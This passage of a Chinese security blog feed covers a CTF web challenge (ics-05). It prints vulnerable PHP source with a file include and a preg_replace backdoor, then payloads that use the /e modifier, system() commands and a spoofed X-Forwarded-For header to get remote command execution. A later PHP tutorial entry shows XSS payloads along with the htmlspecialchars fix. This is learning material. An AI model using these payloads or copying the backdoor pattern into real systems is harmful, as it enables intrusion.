layui-field-title" style="margin-top: 30px;"&gt;</span><br><span class="line">        &lt;legend&gt;设备列表&lt;/legend&gt;</span><br><span class="line">    &lt;/fieldset&gt;</span><br><span class="line">    &lt;table class="layui-hide" id="test"&gt;&lt;/table&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/html"</span> id=<span class="string">"switchTpl"</span>&gt;</span><br><span class="line">        &lt;!-- 这里的 checked 的状态只是演示 --&gt;</span><br><span class="line">        &lt;input type=<span class="string">"checkbox"</span> name=<span class="string">"sex"</span> value=<span class="string">"&#123;&#123;d.id&#125;&#125;"</span> lay-skin=<span class="string">"switch"</span> lay-text=<span class="string">"开|关"</span> lay-filter=<span class="string">"checkDemo"</span> &#123;&#123; d.id==<span class="number">1</span> <span class="number">0003</span> ? <span class="string">'checked'</span> : <span class="string">''</span> &#125;&#125;&gt;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"layui/layui.js"</span> charset=<span class="string">"utf-8"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.<span class="keyword">use</span>(<span class="string">'table'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> table = layui.table,</span><br><span class="line">            form = layui.form;</span><br><span class="line"></span><br><span class="line">        table.render(&#123;</span><br><span class="line">            elem: <span class="string">'#test'</span>,</span><br><span class="line">            url: <span class="string">'/somrthing.json'</span>,</span><br><span class="line">            cellMinWidth: <span class="number">80</span>,</span><br><span class="line">            cols: [</span><br><span class="line">                [</span><br><span class="line">                    &#123; type: <span class="string">'numbers'</span> &#125;,</span><br><span class="line">                     &#123; type: <span class="string">'checkbox'</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'id'</span>, title: <span class="string">'ID'</span>, width: <span class="number">100</span>, unresize: <span class="keyword">true</span>, sort: <span class="keyword">true</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'name'</span>, title: <span class="string">'设备名'</span>, templet: <span class="string">'#nameTpl'</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'area'</span>, title: <span class="string">'区域'</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'status'</span>, title: <span class="string">'维护状态'</span>, minWidth: <span class="number">120</span>, sort: <span class="keyword">true</span> &#125;,</span><br><span class="line">                     &#123; field: <span class="string">'check'</span>, title: <span class="string">'设备开关'</span>, width: <span class="number">85</span>, templet: <span class="string">'#switchTpl'</span>, unresize: <span class="keyword">true</span> &#125;</span><br><span class="line">                ]</span><br><span class="line">            ],</span><br><span class="line">            page: <span class="keyword">true</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.<span class="keyword">use</span>(<span class="string">'element'</span>, <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> element = layui.element; <span class="comment">//导航的hover效果、二级菜单等功能，需要依赖element模块</span></span><br><span class="line">        <span class="comment">//监听导航点击</span></span><br><span class="line">        element.on(<span class="string">'nav(demo)'</span>, <span class="function"><span class="keyword">function</span><span class="params">(elem)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//console.log(elem)</span></span><br><span class="line">            layer.msg(elem.text());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$page = $_GET[page];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($page)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctype_alnum($page)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=<span class="string">"text-align:center"</span>&gt;</span><br><span class="line">        &lt;p class="lead"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">        &lt;div style=<span class="string">"text-align:center"</span>&gt;</span><br><span class="line">            &lt;p class="lead"&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">'input'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">'ta:text'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">'text'</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ($page === <span class="string">'index.php'</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Ok'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">include</span>($page);</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><hr><p>源码审计，得到如下可能存在问题的关键部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到preg_replace函数（执行一个正则表达式的搜索和替换），可以利用preg_replace函数的命令执行漏洞在—/e模式下（即参数pattern输入为/e时）将replacement参数当作PHP代码执行（php5.5版本后已经废弃）；<br>**<br>关于preg_replace：<a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.preg-replace.php</a><br>**<br>先来测试一下，看能不能输出关于PHP配置的信息；<br>构造payload：/index.php?pat=/lww/e&amp;rep=phpinfo()&amp;sub=lww<br>同时还得伪造X_FORWARDED_FOR=== ‘127.0.0.1’；<br>  <img src="/images/ics05-5.png" alt="ics05-5.png"><br>构造：<br>  <img src="/images/ics05-6.png" alt="ics05-6.png"><br>验证成功！<br>接下来尝试读取文件目录，利用system（）函数；<br>构造payload：/index.php?pat=/lww/e&amp;rep=system（“ls”）&amp;sub=lww<br>  <img src="/images/ics05-7.png" alt="ics05-7.png"><br>cd查看s3chahahaDir文件system(“cd%20s3chahahaDir%26%26ls”):<br>**<br>%20url解释为空格、%26为&amp;<br>**</p><p>得到flag文件，cd查看flag文件：<br>  <img src="/images/ics05-8.png" alt="ics05-8.png"><br>得到flag.php，使用cat查看内容：<br>  <img src="/images/ics05-9.png" alt="ics05-9.png"> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ics-05&quot;&gt;&lt;a href=&quot;#ics-05&quot; class=&quot;headerlink&quot; title=&quot;ics-05&quot;&gt;&lt;/a&gt;ics-05&lt;/h1&gt;&lt;h2 id=&quot;题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统&quot;&gt;&lt;a href=&quot;#题目描述
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://singlemindedt.github.io/2019/10/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://singlemindedt.github.io/2019/10/04/正则表达式/</id>
    <published>2019-10-04T06:34:42.000Z</published>
    <updated>2019-10-04T07:18:57.002Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://c.runoob.com/front-end/854" target="_blank" rel="noopener">https://c.runoob.com/front-end/854</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://c.runoob.com/front-end/854&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://c.runoob.com/front-end/854&lt;/a&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="notes" scheme="https://singlemindedt.github.io/categories/notes/"/>
    
    
      <category term="正则表达式" scheme="https://singlemindedt.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>PHP学习</title>
    <link href="https://singlemindedt.github.io/2019/09/30/PHP%E5%AD%A6%E4%B9%A0/"/>
    <id>https://singlemindedt.github.io/2019/09/30/PHP学习/</id>
    <published>2019-09-30T14:44:09.000Z</published>
    <updated>2019-10-03T13:33:07.472Z</updated>
    
    <content type="html"><![CDATA[<p>文章内容主要来自W3School，仅作为学习记录使用。</p><h2 id="在-PHP-创建用户定义函数"><a href="#在-PHP-创建用户定义函数" class="headerlink" title="在 PHP 创建用户定义函数"></a>在 PHP 创建用户定义函数</h2><p>用户定义的函数声明以单词 “function” 开头：</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">functionName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  被执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释：函数名能够以字母或下划线开头（而非数字）。<br>注释：函数名对大小写不敏感。<br>提示：函数名应该能够反映函数所执行的任务。*</p><hr><h2 id="获得数组的长度-count-函数"><a href="#获得数组的长度-count-函数" class="headerlink" title="获得数组的长度 - count() 函数"></a>获得数组的长度 - count() 函数</h2><p>count() 函数用于返回数组的长度（元素数）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cars=<span class="keyword">array</span>(<span class="string">"porsche"</span>,<span class="string">"BMW"</span>,<span class="string">"Volvo"</span>);</span><br><span class="line"><span class="keyword">echo</span> count($cars);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="PHP-关联数组"><a href="#PHP-关联数组" class="headerlink" title="PHP 关联数组"></a>PHP 关联数组</h2><p>关联数组是使用您分配给数组的指定键的数组。<br>有两种创建关联数组的方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$age=<span class="keyword">array</span>(<span class="string">"Bill"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Steve"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Elon"</span>=&gt;<span class="string">"43"</span>);</span><br><span class="line">或者：</span><br><span class="line">$age[<span class="string">'Bill'</span>]=<span class="string">"63"</span>;</span><br><span class="line">$age[<span class="string">'Steve'</span>]=<span class="string">"56"</span>;</span><br><span class="line">$age[<span class="string">'Elon'</span>]=<span class="string">"47"</span>;</span><br></pre></td></tr></table></figure><p>随后可以在脚本中使用指定键：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$age=<span class="keyword">array</span>(<span class="string">"Bill"</span>=&gt;<span class="string">"63"</span>,<span class="string">"Steve"</span>=&gt;<span class="string">"56"</span>,<span class="string">"Elon"</span>=&gt;<span class="string">"47"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Elon is "</span> . $age[<span class="string">'Elon'</span>] . <span class="string">" years old."</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Elon is <span class="number">47</span> years old.</span><br></pre></td></tr></table></figure><hr><h2 id="PHP-数组的排序函数"><a href="#PHP-数组的排序函数" class="headerlink" title="PHP - 数组的排序函数"></a>PHP - 数组的排序函数</h2><p>在本节中，我们将学习如下 PHP 数组排序函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sort() - 以升序对数组排序</span><br><span class="line">rsort() - 以降序对数组排序</span><br><span class="line">asort() - 根据值，以升序对关联数组进行排序</span><br><span class="line">ksort() - 根据键，以升序对关联数组进行排序</span><br><span class="line">arsort() - 根据值，以降序对关联数组进行排序</span><br><span class="line">krsort() - 根据键，以降序对关联数组进行排序</span><br></pre></td></tr></table></figure><hr><h2 id="GET-vs-POST"><a href="#GET-vs-POST" class="headerlink" title="GET vs. POST"></a>GET vs. POST</h2><p>GET 和 POST 都创建数组（例如，array( key =&gt; value, key2 =&gt; value2, key3 =&gt; value3, …)）。此数组包含键/值对，其中的键是表单控件的名称，而值是来自用户的输入数据。<br>GET 和 POST 被视作 $_GET 和 $_POST。它们是超全局变量，这意味着对它们的访问无需考虑作用域 - 无需任何特殊代码，您能够从任何函数、类或文件访问它们。<br>$_GET 是通过 URL 参数传递到当前脚本的变量数组。<br>$_POST 是通过 HTTP POST 传递到当前脚本的变量数组。</p><h3 id="何时使用-GET？"><a href="#何时使用-GET？" class="headerlink" title="何时使用 GET？"></a>何时使用 GET？</h3><p>通过 GET 方法从表单发送的信息对任何人都是可见的（所有变量名和值都显示在 URL 中）。GET 对所发送信息的数量也有限制。限制在大约 2000 个字符。不过，由于变量显示在 URL 中，把页面添加到书签中也更为方便。<br>GET 可用于发送非敏感的数据。<br>注释：绝不能使用 GET 来发送密码或其他敏感信息！</p><h3 id="何时使用-POST？"><a href="#何时使用-POST？" class="headerlink" title="何时使用 POST？"></a>何时使用 POST？</h3><p>通过 POST 方法从表单发送的信息对其他人是不可见的（所有名称/值会被嵌入 HTTP 请求的主体中），并且对所发送信息的数量也无限制。<br>此外 POST 支持高阶功能，比如在向服务器上传文件时进行 multi-part 二进制输入。<br>不过，由于变量未显示在 URL 中，也就无法将页面添加到书签。<br>提示：开发者偏爱 POST 来发送表单数据。</p><hr><h2 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h2><p>表单的 HTML 代码是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"&lt;?php echo htmlspecialchars($_SERVER["</span>PHP_SELF<span class="string">"]);?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><p>当提交此表单时，通过 method=”post” 发送表单数据。<br>什么是 $_SERVER[“PHP_SELF”] 变量？<br>$_SERVER[“PHP_SELF”] 是一种超全局变量，它返回当前执行脚本的文件名。<br>因此，$_SERVER[“PHP_SELF”] 将表单数据发送到页面本身，而不是跳转到另一张页面。这样，用户就能够在表单页面获得错误提示信息。</p><h2 id="什么是-htmlspecialchars-函数？"><a href="#什么是-htmlspecialchars-函数？" class="headerlink" title="什么是 htmlspecialchars() 函数？"></a>什么是 htmlspecialchars() 函数？</h2><p>htmlspecialchars() 函数把特殊字符转换为 HTML 实体。这意味着 &lt; 和 &gt; 之类的 HTML 字符会被替换为 &lt; 和 &gt; 。这样可防止攻击者通过在表单中注入 HTML 或 JavaScript 代码（跨站点脚本攻击）对代码进行利用。</p><h2 id="关于-PHP-表单安全性的重要提示"><a href="#关于-PHP-表单安全性的重要提示" class="headerlink" title="关于 PHP 表单安全性的重要提示"></a>关于 PHP 表单安全性的重要提示</h2><p>$_SERVER[“PHP_SELF”] 变量能够被黑客利用！<br>如果您的页面使用了 PHP_SELF，用户能够输入下划线然后执行跨站点脚本（XSS）。<br>提示：跨站点脚本（Cross-site scripting，XSS）是一种计算机安全漏洞类型，常见于 Web 应用程序。XSS 能够使攻击者向其他用户浏览的网页中输入客户端脚本。<br>假设我们的一张名为 “test_form.php” 的页面中有如下表单：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"&lt;?php echo $_SERVER["</span>PHP_SELF<span class="string">"];?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><p>现在，如果用户进入的是地址栏中正常的 URL：”<a href="http://www.example.com/test_form.php&quot;，上面的代码会转换为：" target="_blank" rel="noopener">http://www.example.com/test_form.php&quot;，上面的代码会转换为：</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"test_form.php"</span>&gt;</span><br></pre></td></tr></table></figure><p>到目前，一切正常。<br>不过，如果用户在地址栏中键入了如下 URL：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.example.com/test_form.php/%22%3E%3Cscript%3Ealert('hacked')%3C/script%3E</span></span><br></pre></td></tr></table></figure><p>在这种情况下，上面的代码会转换为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"test_form.php"</span>/&gt;&lt;script&gt;alert(<span class="string">'hacked'</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这段代码加入了一段脚本和一个提示命令。并且当此页面加载后，就会执行 JavaScript 代码（用户会看到一个提示框）。这仅仅是一个关于 PHP_SELF 变量如何被利用的简单无害案例。<br>您应该意识到 <script> 标签内能够添加任何 JavaScript 代码！黑客能够把用户重定向到另一台服务器上的某个文件，该文件中的恶意代码能够更改全局变量或将表单提交到其他地址以保存用户数据，等等。<br>如果避免 $_SERVER["PHP_SELF"] 被利用？<br>通过使用 htmlspecialchars() 函数能够避免 $_SERVER["PHP_SELF"] 被利用。<br>表单代码是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"&lt;?php echo htmlspecialchars($_SERVER["</span>PHP_SELF<span class="string">"]);?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><p>htmlspecialchars() 函数把特殊字符转换为 HTML 实体。现在，如果用户试图利用 PHP_SELF 变量，会导致如下输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"test_form.php/&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert('hacked')&amp;lt;/script&amp;gt;"</span>&gt;</span><br></pre></td></tr></table></figure><p>无法利用，没有危害！</p><h2 id="通过-PHP-验证表单数据"><a href="#通过-PHP-验证表单数据" class="headerlink" title="通过 PHP 验证表单数据"></a>通过 PHP 验证表单数据</h2><p>我们要做的第一件事是通过 PHP 的 htmlspecialchars() 函数传递所有变量。<br>在我们使用 htmlspecialchars() 函数后，如果用户试图在文本字段中提交以下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href(<span class="string">'http://www.hacked.com'</span>)&lt;/script&gt;</span><br><span class="line">- 代码不会执行，因为会被保存为转义代码，就像这样：</span><br><span class="line">&amp;lt;script&amp;gt;location.href(<span class="string">'http://www.hacked.com'</span>)&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure><p>现在这条代码显示在页面上或 e-mail 中是安全的。<br>在用户提交该表单时，我们还要做两件事：<br>（通过 PHP trim() 函数）去除用户输入数据中不必要的字符（多余的空格、制表符、换行）<br>（通过 PHP stripslashes() 函数）删除用户输入数据中的反斜杠（\）<br>接下来我们创建一个检查函数（相比一遍遍地写代码，这样效率更好）。<br>我们把函数命名为 test_input()。<br>现在，我们能够通过 test_input() 函数检查每个 $_POST 变量，脚本是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">实例</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义变量并设置为空值</span></span><br><span class="line">$name = $email = $gender = $comment = $website = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">  $name = test_input($_POST[<span class="string">"name"</span>]);</span><br><span class="line">  $email = test_input($_POST[<span class="string">"email"</span>]);</span><br><span class="line">  $website = test_input($_POST[<span class="string">"website"</span>]);</span><br><span class="line">  $comment = test_input($_POST[<span class="string">"comment"</span>]);</span><br><span class="line">  $gender = test_input($_POST[<span class="string">"gender"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_input</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">  $data = trim($data);</span><br><span class="line">  $data = stripslashes($data);</span><br><span class="line">  $data = htmlspecialchars($data);</span><br><span class="line">  <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>请注意在脚本开头，我们检查了表单是否使用 $_SERVER["REQUEST_METHOD"] 进行提交。如果 REQUEST_METHOD 是 POST，那么表单已被提交 - 并且应该对其进行验证。如果未提交，则跳过验证并显示一个空白表单。<br>不过，在上面的例子中，所有输入字段都是可选的。即使用户未输入任何数据，脚本也能正常工作。<br>下一步是制作必填输入字段，并创建需要时使用的错误消息。</p><hr><p><strong>关于正则表达式</strong>：记-正则表达式</p><hr><h2 id="PHP-表单验证-验证-E-mail-和-URL"><a href="#PHP-表单验证-验证-E-mail-和-URL" class="headerlink" title="PHP 表单验证 - 验证 E-mail 和 URL"></a>PHP 表单验证 - 验证 E-mail 和 URL</h2><h3 id="PHP-验证名字"><a href="#PHP-验证名字" class="headerlink" title="PHP - 验证名字"></a>PHP - 验证名字</h3><p>以下代码展示的简单方法检查 name 字段是否包含字母和空格。如果 name 字段无效，则存储一条错误消息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$name = test_input($_POST[<span class="string">"name"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z ]*$/"</span>,$name)) &#123;</span><br><span class="line">  $nameErr = <span class="string">"只允许字母和空格！"</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释：preg_match() 函数检索字符串的模式，如果模式存在则返回 true，否则返回 false。</p><h3 id="PHP-验证-E-mail"><a href="#PHP-验证-E-mail" class="headerlink" title="PHP - 验证 E-mail"></a>PHP - 验证 E-mail</h3><p>以下代码展示的简单方法检查 e-mail </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$email = test_input($_POST[<span class="string">"email"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/([\w\-]+\@[\w\-]+\.[\w\-]+)/"</span>,$email)) &#123;</span><br><span class="line">  $emailErr = <span class="string">"无效的 email 格式！"</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PHP-验证-URL"><a href="#PHP-验证-URL" class="headerlink" title="PHP - 验证 URL"></a>PHP - 验证 URL</h3><p>以下代码展示的方法检查 URL 地址语法是否有效（这条正则表达式同时允许 URL 中的斜杠）。如果 URL 地址语法无效，则存储一条错误消息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$website = test_input($_POST[<span class="string">"website"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">"/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%</span></span><br><span class="line"><span class="string">=~_|]/i"</span>,$website)) &#123;</span><br><span class="line">  $websiteErr = <span class="string">"无效的 URL"</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="PHP-验证-Name、E-mail、以及-URL"><a href="#PHP-验证-Name、E-mail、以及-URL" class="headerlink" title="PHP - 验证 Name、E-mail、以及 URL"></a>PHP - 验证 Name、E-mail、以及 URL</h4><p>现在，脚本是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 